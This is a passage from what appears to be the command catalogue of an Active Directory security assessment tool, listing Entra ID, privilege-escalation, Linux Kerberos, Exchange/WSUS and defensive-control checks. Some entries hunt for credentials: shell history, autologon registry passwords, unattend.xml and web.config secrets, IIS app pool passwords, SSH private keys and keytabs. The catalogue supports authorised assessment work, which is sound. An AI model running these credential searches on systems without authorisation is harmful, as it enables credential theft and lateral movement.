          { id: 'entra-aadc-2', title: 'Identify AAD Connect server (AD SCP)', command: "Get-ADObject -Filter {objectClass -eq 'serviceConnectionPoint'} -SearchBase 'CN=Microsoft Azure AD Connect,CN=Services,CN=Configuration,DC=corp,DC=com' -Properties serviceBindingInformation", notes: 'Service connection point reveals AAD Connect server and tenant.' },
          { id: 'entra-aadc-3', title: 'Check sync mode (local, authorized)', command: 'Import-Module ADSync; Get-ADSyncGlobalSettings | Select-Object SyncAccountName', notes: 'Reveals PHS/PTA/ADFS sync mode — run on AAD Connect server.' },
          { id: 'entra-aadc-4', title: 'Find Seamless SSO account', command: "Get-ADComputer -Filter {Name -eq 'AZUREADSSOACC'} -Properties PasswordLastSet,Description", notes: 'AZUREADSSOACC uses a static Kerberos key — stale = Kerberos golden ticket risk.' },
        ],
      },
      {
        id: 'entra-roadtools', name: 'ROADtools and AADInternals posture',
        description: 'Authorized Entra ID tenant and identity posture review.',
        commands: [
          { id: 'entra-rt-1', title: 'Get tenant info (unauthenticated)', command: "curl -s 'https://login.microsoftonline.com/<domain>/.well-known/openid-configuration' | python3 -m json.tool | grep issuer", notes: 'Returns tenant ID from OIDC discovery — no credentials needed.' },
          { id: 'entra-rt-2', title: 'ROADtools — device-code auth', command: 'roadrecon auth --device-code', notes: 'Authorized token acquisition via device-code flow.' },
          { id: 'entra-rt-3', title: 'ROADtools — gather all objects', command: 'roadrecon gather --tokens .roadtools_auth --all', notes: 'Collects users, groups, apps, service principals, role assignments.' },
          { id: 'entra-rt-4', title: 'AADInternals — get tenant domains', command: 'Import-Module AADInternals; Get-AADIntLoginInformation -Domain <domain> | Select-Object DomainName,FederationBrandName,NameSpaceType', notes: 'Returns federation type (Managed/Federated) without credentials.' },
          { id: 'entra-rt-5', title: 'AADInternals — list privileged roles', command: "Import-Module AADInternals; Get-AADIntAzureADRoleMembers -RoleName 'Global Administrator' -AccessToken $token", notes: 'Authorized review of Entra privileged role members.' },
          { id: 'entra-rt-6', title: 'ROADtools — launch GUI', command: 'roadrecon-gui', notes: 'Web interface for exploring collected Entra data.' },
        ],
      },
    ],
    excluded_capabilities: ['token theft from production users', 'cloud tenant abuse', 'unauthorized cloud enumeration'],
  },
  {
    id: 'local_privesc_architecture', name: 'Local Privilege Escalation Architecture', category: 'host-access',
    description: 'Potato/token impersonation, service misconfigurations, unquoted paths, AlwaysInstallElevated, local credential artifacts, kernel paths, SeBackup/SeRestore/SeLoadDriver/SeDebug, and LAPS-readable hosts.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'IMPORT'], read_only: false,
    command_groups: [
      {
        id: 'lprivesc-tokens', name: 'Token privilege review',
        description: 'Identify exploitable token privileges on the current session.',
        commands: [
          { id: 'lpe-tok-1', title: 'List current privileges', command: 'whoami /priv', notes: 'SeImpersonate, SeAssignPrimaryToken, SeBackup, SeRestore, SeLoadDriver, SeDebug — all exploitable.' },
          { id: 'lpe-tok-2', title: 'List active user sessions', command: 'Get-Process | Where-Object {$_.SessionId -gt 0} | Select-Object Id,Name,SessionId', notes: 'Active user sessions with tokens for impersonation.' },
          { id: 'lpe-tok-3', title: 'Find service account tokens', command: "Get-WmiObject -Class Win32_Service | Where-Object {$_.StartName -notmatch 'LocalSystem|LocalService|NetworkService'} | Select-Object Name,StartName,State", notes: 'Services running as domain accounts — token impersonation targets.' },
        ],
      },
      {
        id: 'lprivesc-services', name: 'Service and path misconfigurations',
        description: 'Unquoted paths, weak service ACLs, and writable directories.',
        commands: [
          { id: 'lpe-svc-1', title: 'Find unquoted service paths', command: "Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -match ' ' -and $_.PathName -notmatch '\"' -and $_.PathName -notmatch 'System32'} | Select-Object Name,PathName,StartMode,StartName", notes: 'Space in path without quotes = binary planting opportunity.' },
          { id: 'lpe-svc-2', title: 'PowerUp — all local privesc checks', command: 'Invoke-AllChecks | Format-List', notes: 'Comprehensive local privesc check via PowerUp — authorized host only.' },
          { id: 'lpe-svc-3', title: 'Check AlwaysInstallElevated', command: 'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated && reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated', notes: 'Both must be 1 for MSI elevation abuse.' },
          { id: 'lpe-svc-4', title: 'Check service binary ICACLs', command: 'sc qc <ServiceName>', notes: 'Review binary path for weak ACLs — check icacls on the resulting path.' },
          { id: 'lpe-svc-5', title: 'Check service DACL (accesschk)', command: 'accesschk.exe -uwcqv "Authenticated Users" * /accepteula', notes: 'Lists services writable by Authenticated Users.' },
        ],
      },
      {
        id: 'lprivesc-creds', name: 'Local credential artifact inventory',
        description: 'Credential exposure on local hosts without active dumping.',
        commands: [
          { id: 'lpe-cred-1', title: 'PowerShell history file', command: 'Get-Content (Get-PSReadlineOption).HistorySavePath 2>$null', notes: 'Command history often contains credentials passed as arguments.' },
          { id: 'lpe-cred-2', title: 'Check autologon credentials', command: "reg query 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' /v DefaultPassword", notes: 'Plaintext credential in registry if autologon configured.' },
          { id: 'lpe-cred-3', title: 'Find unattend.xml files', command: 'Get-ChildItem -Path C:\\ -Recurse -Include unattend.xml,Unattended.xml,sysprep.xml -ErrorAction SilentlyContinue | Select-Object FullName', notes: 'Sysprep answer files contain base64-encoded local admin passwords.' },
          { id: 'lpe-cred-4', title: 'Web.config credential search', command: "Get-ChildItem -Path C:\\inetpub,C:\\www -Recurse -Include web.config -ErrorAction SilentlyContinue | Select-String -Pattern 'password|connectionString'", notes: 'IIS web.config often stores DB and service credentials.' },
          { id: 'lpe-cred-5', title: 'Check IIS app pool passwords', command: 'C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /processModel.userName:?* /text:processModel.password', notes: 'App pool identities with hardcoded credentials.' },
        ],
      },
    ],
    excluded_capabilities: ['local exploit execution', 'driver-based privilege escalation'],
  },
  {
    id: 'linux_ad_architecture', name: 'Linux AD Artifact Architecture', category: 'host-access',
    description: 'Kerberos ccache/keytabs, SSSD and Winbind secrets, Impacket auth from Linux, ticket conversion, SSH keys, containers, cron, config management, and shell history on AD-joined Linux hosts.',
    supported_modes: ['LINUX_REMOTE', 'IMPORT'], read_only: false,
    command_groups: [
      {
        id: 'linux-kerberos', name: 'Kerberos cache and keytab review',
        description: 'Discover Kerberos material on Linux AD-joined hosts.',
        commands: [
          { id: 'lin-krb-1', title: 'List active Kerberos tickets', command: 'klist', notes: 'Current ccache ticket inventory.' },
          { id: 'lin-krb-2', title: 'Find all ccache files in /tmp', command: "find /tmp /run /var/tmp -maxdepth 2 -name 'krb5cc_*' 2>/dev/null", notes: 'Per-user Kerberos ticket caches.' },
          { id: 'lin-krb-3', title: 'Find keytab files', command: "find / -name '*.keytab' -o -name 'krb5.keytab' 2>/dev/null | head -20", notes: 'Keytabs enable long-term Kerberos auth — high value.' },
          { id: 'lin-krb-4', title: 'Read keytab principal list (authorized)', command: 'klist -k /etc/krb5.keytab', notes: 'Lists principals and encryption types in the keytab.' },
          { id: 'lin-krb-5', title: 'Check SSSD ticket cache location', command: 'grep -i "ccache_storage\\|krb5_store_password\\|id_provider" /etc/sssd/sssd.conf 2>/dev/null', notes: 'SSSD ccache location and Kerberos configuration.' },
        ],
      },
      {
        id: 'linux-pivot-paths', name: 'Linux pivot and lateral movement surfaces',
        description: 'SSH keys, container escape paths, and config management credential stores.',
        commands: [
          { id: 'lin-piv-1', title: 'Find SSH private keys', command: "find /root /home -name 'id_rsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' 2>/dev/null", notes: 'SSH private keys for lateral movement.' },
          { id: 'lin-piv-2', title: 'Find authorized_keys files', command: 'find /root /home -name authorized_keys 2>/dev/null', notes: 'Lists hosts that trust this key — maps lateral paths.' },
          { id: 'lin-piv-3', title: 'Check shell history for credentials', command: "cat ~/.bash_history ~/.zsh_history 2>/dev/null | grep -iE 'password|passwd|secret|token|key' | head -30", notes: 'Command history credential exposure.' },
          { id: 'lin-piv-4', title: 'Check Ansible vault files', command: "find / -name '*.vault' -o -name 'vault_pass*' 2>/dev/null | head -10", notes: 'Ansible vault files contain encrypted secrets — crack target.' },
          { id: 'lin-piv-5', title: 'Check Docker/Podman socket access', command: 'ls -la /var/run/docker.sock /run/podman/podman.sock 2>/dev/null', notes: 'Writable container socket = container escape to host.' },
          { id: 'lin-piv-6', title: 'Find cron credential leaks', command: "cat /etc/cron* /var/spool/cron/crontabs/* 2>/dev/null | grep -iE 'password|secret|token'", notes: 'Cron scripts with embedded credentials.' },
          { id: 'lin-piv-7', title: 'Check Winbind secrets', command: 'ls -la /var/lib/samba/private/secrets.tdb /var/lib/samba/private/schannel_store.tdb 2>/dev/null', notes: 'Winbind stores machine and service account credentials.' },
        ],
      },
    ],
    excluded_capabilities: ['ticket theft from other users', 'container escape exploitation'],
  },
  {
    id: 'defense_opsec_architecture', name: 'Defensive Controls and OPSEC', category: 'policy',
    description: 'Protected Users, Credential Guard, AES-only Kerberos, LDAP/SMB signing, EPA, tiered administration, audit events, noise guide, LDAP OPSEC, and preferred low-noise alternatives.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'], read_only: false,
    command_groups: [
      {
        id: 'defense-controls', name: 'Defensive control posture checks',
        description: 'Enumerate defensive mitigations across identity and network layers.',
        commands: [
          { id: 'def-ctrl-1', title: 'Protected Users group membership', command: "Get-ADGroupMember 'Protected Users' | Select-Object SamAccountName,ObjectClass,DistinguishedName", notes: 'Members get: AES-only, no NTLM, no delegation, no caching.' },
          { id: 'def-ctrl-2', title: 'Credential Guard state', command: 'Get-CimInstance -ClassName Win32_DeviceGuard | Select-Object SecurityServicesRunning,VirtualizationBasedSecurityStatus,RequiredSecurityProperties', notes: 'LSAIso (2) = VBS Credential Guard active.' },
          { id: 'def-ctrl-3', title: 'SMB signing required (DC)', command: 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters /v RequireSecuritySignature', notes: '1 = signing required on this host; 0 = relay-vulnerable.' },
          { id: 'def-ctrl-4', title: 'LDAP signing required', command: 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters /v LDAPServerIntegrity', notes: '2 = required; 1 = negotiated; 0 = unsigned allowed.' },
          { id: 'def-ctrl-5', title: 'LDAP channel binding', command: 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters /v LdapEnforceChannelBinding', notes: '2 = always enforced.' },
          { id: 'def-ctrl-6', title: 'Defender / AV state', command: 'Get-MpComputerStatus | Select-Object AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,AMRunningMode', notes: 'Endpoint protection posture.' },
          { id: 'def-ctrl-7', title: 'Check Windows Event Forwarding', command: 'Get-ChildItem HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\EventLog\\EventForwarding 2>$null', notes: 'WEF active = logs forwarded to SIEM — relevant for OPSEC planning.' },
        ],
      },
      {
        id: 'opsec-noise-guide', name: 'Technique noise reference',
        description: 'Assessment technique noise classification for detection-aware planning.',
        commands: [
          { id: 'opsec-1', title: 'Low-noise techniques', command: 'Targeted LDAP queries; BloodHound DCOnly; passive DNS; passive OSINT', notes: 'Minimal telemetry — preferred for initial collection.' },
          { id: 'opsec-2', title: 'Medium-noise techniques', command: 'BloodHound Session collection; DCSync; relay with signing gaps; Coercer; Kerberoast', notes: 'Generates detectable artifacts — time window matters.' },
          { id: 'opsec-3', title: 'High-noise techniques', command: 'PsExec; mass LSASS dumping; active LLMNR/NBT-NS poisoning; unconstrained delegation coercion sweep', notes: 'Likely to trigger SIEM/EDR — explicit change-window required.' },
          { id: 'opsec-4', title: 'Check audit event coverage', command: 'auditpol /get /category:*', notes: 'Review which events are audited before triggering techniques.' },
          { id: 'opsec-5', title: 'Check Windows Event Forwarding policy', command: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\EventLog\\EventForwarding', notes: 'WEF config policy — logs forwarded to SIEM.' },
        ],
      },
    ],
    excluded_capabilities: ['defense evasion implementation', 'EDR bypass techniques'],
  },
  {
    id: 'misconfiguration_checklist_architecture', name: 'Common Misconfiguration Checklist', category: 'policy',
    description: 'Checklist coverage for Kerberos, NTLM, AD CS, ACLs, credential hygiene, network services, SCCM, ADIDNS, WSUS, Exchange, and management-plane exposure.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'], read_only: false,
    command_groups: [
      {
        id: 'misc-kerberos-ntlm', name: 'Kerberos and NTLM hygiene checklist',
        description: 'High-frequency engagement findings around Kerberos and NTLM configuration.',
        commands: [
          { id: 'misc-krb-1', title: 'Check pre-auth disabled (AS-REP)', command: 'Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true -and Enabled -eq $true} | Select-Object SamAccountName', notes: 'Any enabled users = AS-REP roastable.' },
          { id: 'misc-krb-2', title: 'Check RC4 encryption type (Kerberoast)', command: "Get-ADObject -LDAPFilter '(|(userAccountControl:1.2.840.113556.1.4.803:=4194304)(servicePrincipalName=*))' -Properties msDS-SupportedEncryptionTypes | Where-Object {$_.'msDS-SupportedEncryptionTypes' -band 4} | Select-Object SamAccountName", notes: 'RC4 (flag 4) = easy-crack Kerberoast target.' },
          { id: 'misc-krb-3', title: 'Check NTLM v1 compatibility', command: 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v LmCompatibilityLevel', notes: '< 5 = NTLMv1 allowed — downgrade and relay risk.' },
          { id: 'misc-krb-4', title: 'Check NTLMv1 in group policy', command: "Get-GPOReport -All -ReportType Xml | Select-String -Pattern 'LmCompatibilityLevel'", notes: 'GPO-enforced NTLM level override.' },
        ],
      },
      {
        id: 'misc-adcs-acl', name: 'AD CS and ACL checklist',
        description: 'Certificate service and ACL misconfigurations.',
        commands: [
          { id: 'misc-adcs-1', title: 'Certipy — full ADCS scan (authorized)', command: 'certipy find -u <user>@<domain> -p <pass> -dc-ip <IP> -vulnerable -stdout', notes: 'Identifies ESC1-ESC16, template misconfigs, and CA relay paths.' },
          { id: 'misc-adcs-2', title: 'Check MachineAccountQuota', command: "Get-ADDomain | Select-Object -ExpandProperty 'ms-DS-MachineAccountQuota'", notes: 'MAQ > 0 enables RBCD/noPac chains for unprivileged users.' },
          { id: 'misc-adcs-3', title: 'Check AdminSDHolder non-default ACEs', command: "(Get-Acl 'AD:\\CN=AdminSDHolder,CN=System,DC=corp,DC=com').Access | Where-Object {$_.IdentityReference -notmatch 'Domain Admins|Enterprise Admins|Administrators|SYSTEM|CREATOR OWNER'} | Select-Object IdentityReference,ActiveDirectoryRights", notes: 'Propagates to all protected objects every 60 min.' },
          { id: 'misc-adcs-4', title: 'Check domain root DCSync ACEs', command: "(Get-Acl 'AD:\\DC=corp,DC=com').Access | Where-Object { $_.ObjectType -in @('1131f6aa-9c07-11d1-f79f-00c04fc2dcd2','1131f6ab-9c07-11d1-f79f-00c04fc2dcd2') } | Select-Object IdentityReference,ActiveDirectoryRights", notes: 'Non-DA accounts with replication rights = DCSync.' },
        ],
      },
      {
        id: 'misc-network-mgmt', name: 'Network and management-plane checklist',
        description: 'Relay, coercion, and enterprise-management exposure.',
        commands: [
          { id: 'misc-net-1', title: 'Check LLMNR policy', command: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\DNSClient /v EnableMulticast', notes: '0 = LLMNR disabled; missing or 1 = poisoning risk.' },
          { id: 'misc-net-2', title: 'Check NBT-NS', command: 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\NetBT\\Parameters /v NodeType', notes: '2 or 8 = point-to-point/hybrid; 1 or 4 = B-node = NBT-NS enabled.' },
          { id: 'misc-net-3', title: 'Check WebClient running', command: 'Get-Service WebClient | Select-Object Status', notes: 'Running = WebDAV coercion path enabled.' },
          { id: 'misc-net-4', title: 'Check WSUS transport (HTTP)', command: "reg query 'HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate' /v WUServer", notes: 'HTTP WSUS URL = MITM update injection risk.' },
          { id: 'misc-net-5', title: 'Check Exchange Windows Permissions membership', command: "Get-ADGroupMember 'Exchange Windows Permissions' | Select-Object SamAccountName,ObjectClass", notes: 'Members have WriteDACL on domain root = DCSync path.' },
        ],
      },
    ],
    excluded_capabilities: [],
  },
  {
    id: 'wsus_exchange_architecture', name: 'WSUS and Exchange Architecture', category: 'enterprise-management',
    description: 'WSUS command push/MITM posture, WSUSpendu, SharpWSUS, Exchange permission abuse, PrivExchange, ProxyLogon/ProxyShell/ProxyNotShell, mailbox search, GAL extraction, transport rules, and OWA credential-harvesting references.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'], read_only: false,
    command_groups: [
      {
        id: 'wsus-posture', name: 'WSUS posture checks',
        description: 'WSUS server discovery and transport security review.',
        commands: [
          { id: 'wsus-1', title: 'Find WSUS server URL (registry)', command: "reg query 'HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate' /v WUServer", notes: 'HTTP WSUS URL = plaintext update traffic, MITM risk.' },
          { id: 'wsus-2', title: 'Find WSUS server (PowerShell)', command: "Get-ItemProperty 'HKLM:\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate' | Select-Object WUServer,WUStatusServer", notes: 'WSUS server and status server endpoint.' },
          { id: 'wsus-3', title: 'Find WSUS via AD SPN', command: "Get-ADObject -LDAPFilter '(servicePrincipalName=http/WSUS*)' -Properties servicePrincipalName | Select-Object Name,servicePrincipalName", notes: 'AD-registered WSUS server via SPN.' },
          { id: 'wsus-4', title: 'SharpWSUS — list computers (authorized lab)', command: 'SharpWSUS.exe list', notes: 'Lists WSUS-managed computers — authorized testing only.' },
          { id: 'wsus-5', title: 'Check WSUS service transport', command: 'nmap -Pn -p 8530,8531 -sV <IP>', notes: '8530=HTTP, 8531=HTTPS — HTTP endpoint is vulnerable to MITM.' },
        ],
      },
      {
        id: 'exchange-posture', name: 'Exchange exposure checks',
        description: 'Exchange permission abuse, CVE posture, and AD integration.',
        commands: [
          { id: 'exch-1', title: 'Check Exchange Windows Permissions ACL', command: "Get-ADGroupMember 'Exchange Windows Permissions' | Select-Object SamAccountName,ObjectClass,DistinguishedName", notes: 'EWP members have WriteDACL on domain root — DCSync path.' },
          { id: 'exch-2', title: 'Check Exchange Trusted Subsystem', command: "Get-ADGroupMember 'Exchange Trusted Subsystem' | Select-Object SamAccountName,ObjectClass", notes: 'EXCHANGE$ computer account compromise = domain control path.' },
          { id: 'exch-3', title: 'Check Exchange server version', command: 'nmap -Pn -p 443 --script http-headers <ExchangeIP> | grep X-OWA', notes: 'Exchange OWA headers reveal version for CVE mapping.' },
          { id: 'exch-4', title: 'Find Exchange servers (AD)', command: "Get-ADObject -LDAPFilter '(objectClass=msExchExchangeServer)' -Properties cn,msExchCurrentServerRoles | Select-Object cn,msExchCurrentServerRoles", notes: 'AD-registered Exchange servers.' },
          { id: 'exch-5', title: 'Check PrivExchange ACL (WriteProperty)', command: "(Get-Acl 'AD:\\DC=corp,DC=com').Access | Where-Object {$_.IdentityReference -match 'Exchange'} | Select-Object IdentityReference,ActiveDirectoryRights", notes: 'PrivExchange writes DACL on domain object to grant relay target DCSync.' },
        ],
      },
    ],
    excluded_capabilities: ['malicious update approval', 'mailbox exfiltration', 'Exchange exploitation'],
  },
  {
    id: 'evasion_reference_architecture', name: 'AMSI CLM AppLocker and EDR Reference', category: 'policy',
    description: 'AMSI, CLM, AppLocker, WDAC, ETW, kernel callbacks, LOLBAS, BYOVD risk, and practical control-validation decision trees.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'IMPORT'], read_only: false,
    command_groups: [
      {
        id: 'evasion-amsi-clm', name: 'AMSI and CLM posture',
        description: 'Verify script restriction and Defender state without triggering bypasses.',
        commands: [
          { id: 'evasion-amsi-1', title: 'Check PowerShell language mode', command: '$ExecutionContext.SessionState.LanguageMode', notes: 'FullLanguage = unrestricted; ConstrainedLanguage = AppLocker/WDAC restricted.' },
          { id: 'evasion-amsi-2', title: 'Check AMSI providers', command: "reg query 'HKLM\\SOFTWARE\\Microsoft\\AMSI\\Providers'", notes: 'Lists registered AMSI providers — missing or disabled = no script scanning.' },
          { id: 'evasion-amsi-3', title: 'Check Windows Defender state', command: 'Get-MpComputerStatus | Select-Object AntivirusEnabled,RealTimeProtectionEnabled,AMRunningMode,AMProductVersion', notes: 'AMRunningMode: Normal=active, Passive=coexistence, EDRBlock=EDR-only.' },
          { id: 'evasion-amsi-4', title: 'Check ScriptBlockLogging', command: "reg query 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging' /v EnableScriptBlockLogging", notes: '1 = all script blocks logged to Event ID 4104.' },
          { id: 'evasion-amsi-5', title: 'Check ModuleLogging', command: "reg query 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging' /v EnableModuleLogging", notes: '1 = module pipeline execution logged.' },
        ],
      },
      {
        id: 'evasion-applocker-wdac', name: 'AppLocker and WDAC policy review',
        description: 'Enumerate code integrity policies and their enforcement mode.',
        commands: [
          { id: 'evasion-al-1', title: 'Get effective AppLocker policy', command: 'Get-AppLockerPolicy -Effective | Format-List', notes: 'Shows effective rules for Exe, Script, MSI, DLL, and PackagedApp.' },
          { id: 'evasion-al-2', title: 'Check AppLocker service state', command: 'Get-Service AppIDSvc | Select-Object Status,StartType', notes: 'AppIDSvc must run for AppLocker enforcement.' },
          { id: 'evasion-al-3', title: 'Check WDAC policy (Device Guard)', command: 'Get-CimInstance -ClassName Win32_DeviceGuard | Select-Object CodeIntegrityPolicyEnforcementStatus,UsermodeCodeIntegrityPolicyEnforcementStatus', notes: '2 = enforcement mode; 1 = audit mode; 0 = off.' },
          { id: 'evasion-al-4', title: 'Check WDAC policy files', command: 'Get-ChildItem C:\\Windows\\System32\\CodeIntegrity\\CIPolicies\\Active\\ -ErrorAction SilentlyContinue | Select-Object Name,LastWriteTime', notes: 'Active WDAC policy binary files.' },
          { id: 'evasion-al-5', title: 'Check ETW provider state', command: 'logman query providers | findstr -i "Microsoft-Windows-DotNETRuntime\\|Microsoft-Windows-PowerShell"', notes: 'ETW providers feeding SIEM visibility into .NET and PS runtime.' },
          { id: 'evasion-al-6', title: 'Review LOLBAS allowed paths (reference)', command: 'Get-AppLockerPolicy -Effective | Where-Object {$_.PolicyType -eq "Exe"} | Select-Object -ExpandProperty RuleCollections', notes: 'Reference: identify allowed LOLBAS paths under AppLocker exceptions.' },
        ],
      },
    ],
    excluded_capabilities: ['AMSI bypass implementation', 'EDR evasion', 'BYOVD execution'],
  },
]

const exposureQuickCheckModules: CollectionModule[] = [
  {
    id: 'exposure_quick_checks',
    name: 'Exposure Quick Checks',
    category: 'identity-hygiene',
    description: 'Fast read-only checks that surface common AD exposure signals in both remote Linux collection and Windows PowerShell ZIP collection.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'],
    read_only: false,
    command_groups: [
      {
        id: 'windows-exposure-identity',
        name: 'Windows identity exposure',
        description: 'PowerShell AD-module checks for the account and host flags most often tied to findings.',
        commands: [
          { id: 'quick-get-aduser-risk', title: 'Collect risky user account flags', command: 'Get-ADUser -Filter * -Properties SamAccountName,SID,Enabled,AdminCount,UserAccountControl,PasswordNeverExpires,DoesNotRequirePreAuth,ServicePrincipalName,TrustedForDelegation,TrustedToAuthForDelegation,AccountNotDelegated,LastLogonDate,PasswordLastSet,DistinguishedName,msDS-SupportedEncryptionTypes', notes: 'Feeds AS-REP, Kerberoast, PASSWD_NOTREQD, delegation, stale, adminCount, and RC4-only detections.' },
          { id: 'quick-get-adcomputer-risk', title: 'Collect risky computer account flags', command: 'Get-ADComputer -Filter * -Properties SamAccountName,SID,Name,Enabled,DNSHostName,OperatingSystem,UserAccountControl,TrustedForDelegation,TrustedToAuthForDelegation,ServicePrincipalName,DistinguishedName,ms-Mcs-AdmPwdExpirationTime,msLAPS-PasswordExpirationTime', notes: 'Feeds unconstrained delegation, DC inventory, stale host, and LAPS coverage checks.' },
          { id: 'quick-get-domain-policy', title: 'Collect domain policy and MAQ', command: 'Get-ADDomain | Select-Object DNSRoot,NetBIOSName,DomainMode,Forest,DistinguishedName,ms-DS-MachineAccountQuota', notes: 'Feeds MachineAccountQuota and domain metadata checks.' },
          { id: 'quick-get-tier0-groups', title: 'Collect high-value group membership', command: "Get-ADGroup -LDAPFilter '(|(samAccountName=Domain Admins)(samAccountName=Enterprise Admins)(samAccountName=Schema Admins)(samAccountName=Administrators)(samAccountName=Protected Users))' -Properties member,adminCount", notes: 'Tier-0 and Protected Users coverage without modifying group state.' },
        ],
      },
      {
        id: 'windows-exposure-network',
        name: 'Windows network policy exposure',
        description: 'Registry and service-state checks that map to relay, NTLM downgrade, and remote-management findings.',
        commands: [
          { id: 'quick-reg-smb-signing', title: 'Check SMB signing requirement', command: 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters /v RequireSecuritySignature', notes: '0 or missing indicates SMB signing is not required on the queried host.' },
          { id: 'quick-reg-ldap-signing', title: 'Check LDAP signing requirement', command: 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters /v LDAPServerIntegrity', notes: '2 means LDAP signing is required on a DC.' },
          { id: 'quick-reg-ldap-channel-binding', title: 'Check LDAP channel binding', command: 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters /v LdapEnforceChannelBinding', notes: '2 means LDAP channel binding is always enforced.' },
          { id: 'quick-reg-lmcompat', title: 'Check NTLM compatibility level', command: 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v LmCompatibilityLevel', notes: '5 is the hardened setting: NTLMv2 only, refuse LM and NTLM.' },
          { id: 'quick-winrm-service', title: 'Check WinRM service listener policy', command: 'winrm get winrm/config/service', notes: 'Remote management exposure and authentication settings.' },
        ],
      },
      {
        id: 'linux-exposure-ldap',
        name: 'Remote Linux LDAP exposure',
        description: 'Authenticated ldapsearch checks for account, policy, delegation, and LAPS posture.',
        commands: [
          { id: 'quick-ldap-domain-policy', title: 'Read domain policy', command: "ldapsearch -x -H ldap://<IP> -D <user> -w <pass> -b <base_dn> '(objectClass=domain)' minPwdLength lockoutThreshold pwdHistoryLength pwdProperties ms-DS-MachineAccountQuota msDS-Behavior-Version", notes: 'Remote policy and MAQ baseline.' },
          { id: 'quick-ldap-asrep', title: 'Find AS-REP roastable accounts', command: "ldapsearch -x -H ldap://<IP> -D <user> -w <pass> -b <base_dn> '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' sAMAccountName userAccountControl", notes: 'Flags DONT_REQUIRE_PREAUTH without requesting hashes.' },
          { id: 'quick-ldap-spn-users', title: 'Find SPN-bearing users', command: "ldapsearch -x -H ldap://<IP> -D <user> -w <pass> -b <base_dn> '(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))' sAMAccountName servicePrincipalName msDS-SupportedEncryptionTypes adminCount", notes: 'Remote Kerberoast surface inventory without requesting TGS tickets.' },
          { id: 'quick-ldap-unconstrained', title: 'Find unconstrained delegation', command: "ldapsearch -x -H ldap://<IP> -D <user> -w <pass> -b <base_dn> '(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))' dNSHostName sAMAccountName userAccountControl", notes: 'High-impact host delegation exposure.' },
          { id: 'quick-ldap-laps', title: 'Check LAPS coverage', command: "ldapsearch -x -H ldap://<IP> -D <user> -w <pass> -b <base_dn> '(|(ms-Mcs-AdmPwdExpirationTime=*)(msLAPS-PasswordExpirationTime=*))' dNSHostName ms-Mcs-AdmPwdExpirationTime msLAPS-PasswordExpirationTime", notes: 'Coverage signal only; does not read managed passwords.' },
        ],
      },
      {
        id: 'linux-exposure-network',
        name: 'Remote Linux network exposure',
        description: 'Safe network-level checks for AD service reachability and signing posture.',
        commands: [
          { id: 'quick-nmap-ad-ports', title: 'Check core AD ports', command: 'nmap -Pn -p 53,88,135,389,445,464,636,3268,3269,5985,5986 <IP>', notes: 'Confirms LDAP, Kerberos, SMB, GC, LDAPS, and WinRM exposure from the scanner host.' },
          { id: 'quick-nmap-smb-signing', title: 'Check SMB signing', command: 'nmap -Pn -p445 --script smb2-security-mode,smb-security-mode <IP>', notes: 'Identifies SMB signing enabled-but-not-required posture.' },
          { id: 'quick-ldap-rootdse-controls', title: 'Read LDAP RootDSE controls', command: "ldapsearch -x -H ldap://<IP> -s base -b '' supportedCapabilities supportedControl defaultNamingContext configurationNamingContext dnsHostName", notes: 'LDAP feature and naming context discovery.' },
        ],
      },
    ],
    excluded_capabilities: ['credential dumping', 'password spraying', 'ticket requests', 'relay execution', 'directory modification'],
  },
]

const megaExpansionModules: CollectionModule[] = [
  {
    id: 'fgpp',
    name: 'Fine-Grained Password Policy',
    category: 'identity-hygiene',
    description: 'PSO enumeration, msDS-PasswordSettings objects, Fine-Grained Password Policy application scope, and per-user/group policy overrides.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'],
    read_only: false,
    command_groups: [
      {
        id: 'fgpp-windows', name: 'Windows FGPP queries',
        description: 'PowerShell and AD-module FGPP enumeration.',
        commands: [
